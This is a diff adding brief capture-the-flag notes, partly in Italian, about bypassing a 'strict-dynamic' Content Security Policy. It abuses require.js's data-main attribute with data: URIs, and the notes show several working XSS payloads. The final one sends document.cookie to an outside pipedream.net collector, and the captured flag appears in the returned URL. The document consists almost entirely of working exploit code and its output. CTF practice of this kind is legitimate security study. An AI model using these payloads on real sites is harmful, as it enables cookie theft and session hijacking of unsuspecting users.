@@ -1,0 +1,21 @@
+CSP policy:
+default-src 'self'; script-src 'strict-dynamic' 'nonce-04nLMWi9R5'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; 
+    font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none'
+
+
+FUNZIONA:
+<script data-main='data:1,alert(1)' src='require.js'></script>
+
+FUNZIONA:
+<script data-main='data:1,alert("aaa")' src='require.js'></script>
+
+FUNZIONA:
+<script data-main='data:1,var a = 2; var b = 3; var c = a + b; alert(c)' src='require.js'></script>
+
+DEFINITIVO:
+<script data-main='data:1,url = "https://en8smvlo3odsvvp.m.pipedream.net/"; url_completo = url.concat(document.cookie); window.open(url_completo)' src='require.js'></script>
+
+I get:
+https://en8smvlo3odsvvp.m.pipedream.net/flag=flag%7Bth4t-w4s3nt-s0-str1ct-w4snt-it?}
+
+flag%7Bth4t-w4s3nt-s0-str1ct-w4snt-it?} -> flag{th4t-w4s3nt-s0-str1ct-w4snt-it?}
